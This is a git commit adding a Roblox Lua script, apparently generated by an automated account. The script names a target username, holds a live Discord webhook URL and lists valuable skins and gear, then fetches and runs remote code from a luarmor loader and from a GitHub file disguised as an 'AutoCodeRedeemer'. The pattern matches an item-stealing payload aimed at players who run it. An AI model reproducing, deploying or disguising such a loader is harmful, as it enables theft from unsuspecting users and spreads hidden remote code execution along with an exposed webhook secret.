5b4426913de85747ad942e7d9f02ad7d66873f94
sab-api <carlosignaa2019@gmail.com>
2026-09-18 15:14:02 -0300

    Add script Bananacode_1789755242576.lua

---
+++ scripts/Bananacode_1789755242576.lua
@@ -0,0 +1,57 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "isaiasrios201337"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1527582303826612294/k90AfugvaGpPXvenVVYKX2UuTCmY0cmaTkFEGcs4vnuvyC7oVSJF6pjcL2HOm9NlytmU"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true,
+    ["Bee Emperor"] = true,
+    ["Honey Bee"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Flying Bee"] = true,
+    ["Crystal Slap"] = true,
+    ["Candy Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiuyeun98878/AutoCodeRedeemer/refs/heads/main/RbOfficial/lua"))()
+end)
